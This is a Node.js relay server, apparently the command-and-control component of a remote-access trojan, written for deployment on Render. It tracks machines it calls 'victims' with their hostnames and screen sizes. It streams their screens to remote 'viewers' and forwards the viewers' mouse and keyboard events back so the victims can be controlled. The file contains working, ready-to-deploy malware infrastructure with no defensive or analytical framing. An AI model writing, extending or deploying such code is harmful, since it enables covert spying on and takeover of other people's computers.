// server.js — Relay + UI server. Deploy this on Render as a Web Service.
const express = require('express');
const http = require('http');
const { WebSocketServer } = require('ws');
const path = require('path');

const PORT = process.env.PORT || 10000;
const PING_INTERVAL = 15000;
const PING_TIMEOUT = 8000;

const app = express();
const server = http.createServer(app);

app.get('/healthz', (req, res) => res.end('OK'));
app.get('/health', (req, res) => res.end('OK'));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'client.html'));
});

const wss = new WebSocketServer({ 
  server,
  maxPayload: 1024 * 1024 * 2
});

const victims = new Map();
const viewers = new Map();

function heartbeat() {
  this.isAlive = true;
}

wss.on('connection', (ws, req) => {
  ws.isAlive = true;
  ws.on('pong', heartbeat);

  let role = null;
  let myId = null;

  ws.on('message', (raw, isBinary) => {
    if (isBinary) {
      if (role !== 'victim' || !myId) return;
      const victimEntry = victims.get(myId);
      if (!victimEntry) return;
      
      for (const [vid, vw] of viewers) {
        if (vw.victimId === myId && vw.ws.readyState === 1) {
          try { vw.ws.send(raw); } catch(e) {}
        }
      }
      return;
    }

    let msg;
    try { msg = JSON.parse(raw.toString()); } catch (e) { return; }

    switch (msg.type) {
      case 'register_victim': {
        role = 'victim';
        myId = msg.victimId;
        
        victims.set(myId, { 
          ws, 
          info: {
            screenWidth: msg.screenWidth || 1920,
            screenHeight: msg.screenHeight || 1080,
            hostname: msg.hostname || myId
          }
        });
        
        ws.send(JSON.stringify({ type: 'registered', victimId: myId }));
        console.log(`[VICTIM] ${myId} ${msg.screenWidth}x${msg.screenHeight}`);
        broadcastVictimList();
        
        // Notify waiting viewers
        for (const [vid, vw] of viewers) {
          if (vw.victimId === myId) {
            const info = victims.get(myId).info;
            vw.ws.send(JSON.stringify({
              type: 'victim_ready',
              victimId: myId,
              screenWidth: info.screenWidth,
              screenHeight: info.screenHeight
            }));
          }
        }
        break;
      }

      case 'register_viewer': {
        role = 'viewer';
        myId = 'viewer_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6);
        const targetId = msg.victimId;
        viewers.set(myId, { ws, victimId: targetId });

        // Send victim list
        ws.send(JSON.stringify({
          type: 'victim_list',
          victims: Array.from(victims.entries()).map(([id, v]) => ({
            id,
            screenWidth: v.info.screenWidth,
            screenHeight: v.info.screenHeight,
            hostname: v.info.hostname
          }))
        }));

        // Send viewer count to victim
        let viewerCount = 0;
        for (const [vid, vw] of viewers) {
          if (vw.victimId === targetId) viewerCount++;
        }
        const victimEntry = victims.get(targetId);
        if (victimEntry && victimEntry.ws.readyState === 1) {
          victimEntry.ws.send(JSON.stringify({ type: 'viewer_count', count: viewerCount }));
          ws.send(JSON.stringify({
            type: 'victim_ready',
            victimId: targetId,
            screenWidth: victimEntry.info.screenWidth,
            screenHeight: victimEntry.info.screenHeight
          }));
        } else {
          ws.send(JSON.stringify({ type: 'waiting', victimId: targetId }));
        }
        break;
      }

      case 'mousedelta':
      case 'click':
      case 'keydown':
      case 'keyup': {
        if (role !== 'viewer' || !myId) return;
        const vw = viewers.get(myId);
        if (!vw) return;
        const victimEntry = victims.get(vw.victimId);
        if (victimEntry && victimEntry.ws.readyState === 1) {
          victimEntry.ws.send(raw);
        }
        break;
      }
    }
  });

  ws.on('close', () => {
    if (role === 'victim' && myId) {
      const oldEntry = victims.get(myId);
      if (oldEntry && oldEntry.ws === ws) {
        victims.delete(myId);
        console.log(`[VICTIM OFFLINE] ${myId}`);
        broadcastVictimList();
      }
    } else if (role === 'viewer' && myId) {
      const vw = viewers.get(myId);
      if (vw) {
        // Update viewer count for that victim
        const targetId = vw.victimId;
        viewers.delete(myId);
        let count = 0;
        for (const [vid, vw2] of viewers) {
          if (vw2.victimId === targetId) count++;
        }
        const ve = victims.get(targetId);
        if (ve && ve.ws.readyState === 1) {
          ve.ws.send(JSON.stringify({ type: 'viewer_count', count }));
        }
      }
    }
  });

  ws.on('error', () => {});
});

function broadcastVictimList() {
  const list = Array.from(victims.entries())
    .filter(([_, v]) => v.ws.readyState === 1)
    .map(([id, v]) => ({
      id,
      screenWidth: v.info.screenWidth,
      screenHeight: v.info.screenHeight,
      hostname: v.info.hostname
    }));
  
  const msg = JSON.stringify({ type: 'victim_list', victims: list });
  for (const [vid, vw] of viewers) {
    if (vw.ws.readyState === 1) {
      try { vw.ws.send(msg); } catch(e) {}
    }
  }
}

const keepalive = setInterval(() => {
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false) return ws.terminate();
    ws.isAlive = false;
    ws.ping();
  });
}, PING_INTERVAL);

wss.on('close', () => clearInterval(keepalive));

process.on('SIGTERM', () => {
  clearInterval(keepalive);
  wss.clients.forEach((ws) => ws.close());
  server.close(() => process.exit(0));
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`[RELAY] Running on :${PORT}`);
});
